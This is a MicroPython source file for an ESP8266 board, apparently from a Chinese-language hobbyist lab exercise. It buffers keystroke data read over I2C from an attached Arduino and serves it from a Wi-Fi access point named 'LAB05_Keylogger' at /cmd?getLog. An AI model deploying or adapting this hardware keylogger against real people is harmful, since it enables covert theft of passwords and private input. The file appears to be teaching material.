import utime, network, ESP8266WebServer
from machine import Pin, I2C

logStr = b''              #儲存資料的變數
ssid = "LAB05_Keylogger"  #設定無線基地台名稱
password = "12345678"     #設定密碼
ard_i2c_addr = 4     
    
def handleCmd(socket, args):                        # 處理 /cmd 指令的函式
    global logStr
    if 'getLog' in args:                            # 檢查是否有 getLog 參數 
        ESP8266WebServer.ok(socket, "200", logStr)  # 回應已儲存的資料給瀏覽器
        logStr = b''        
    else:
        ESP8266WebServer.err(socket, "400", "ERR") # 回應 ERR 給瀏覽器
   
print("啟動中...")
ap = network.WLAN(network.AP_IF)            # 取得基地台介面
ap.active(True)                             # 啟用基地台
ap.config(essid=ssid, password=password)    # 設定基地台 SSID 及密碼
i2c = I2C(scl=Pin(5), sda=Pin(4))           # 設定 i2c 腳位
while ap.active() == False:                 # 等待基地台建置
  pass         
print("已啟動")

ESP8266WebServer.begin(80)                  # 啟用網站
ESP8266WebServer.onPath("/cmd",handleCmd)   # 指定處理指令的函式
ESP8266WebServer.setDocPath("/keylogger")   # 指定 HTML 檔路徑

seTimer = utime.ticks_add(utime.ticks_ms(), 200)            # 將計時器變數設定為當下時間之後 200 毫秒
while True:
    ESP8266WebServer.handleClient()                         # 持續檢查是否收到新指令
    if utime.ticks_diff(seTimer, utime.ticks_ms()) < 0:     # 當計時器變數與現在的時間差小於 0 則執行任務
        try:
            readStr = i2c.readfrom(ard_i2c_addr, 32)        # 使用 i2c 來向特定頻道 slave 要求長度 32 bytes 資料
            logStr += readStr[:readStr.find(b'\xff')]       # 略過無用的空資料
        except:
            pass
        seTimer = utime.ticks_add(utime.ticks_ms(), 200)    # 重置定時器



